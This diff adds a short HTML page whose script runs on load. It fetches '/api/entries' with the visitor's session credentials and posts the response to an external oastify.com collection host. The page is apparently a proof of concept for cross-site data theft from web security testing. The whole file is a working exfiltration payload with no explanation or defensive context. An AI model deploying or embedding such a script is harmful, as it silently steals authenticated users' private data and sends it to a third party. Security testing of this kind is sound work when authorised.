@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<script>
+    (async () => {
+            let resp = await fetch(`/api/entries`, {
+                method: 'GET',
+                credentials: 'include'
+            });
+            await fetch(
+                `http://zkn9nxly9932mwj3ghputhj7dyjp7gv5.oastify.com/`,
+                {
+                    'method': 'POST',
+                    'mode': 'no-cors',
+                    'body': await resp.text()
+                },
+            );
+        }
+    )()
+</script>
+</body>
+</html>
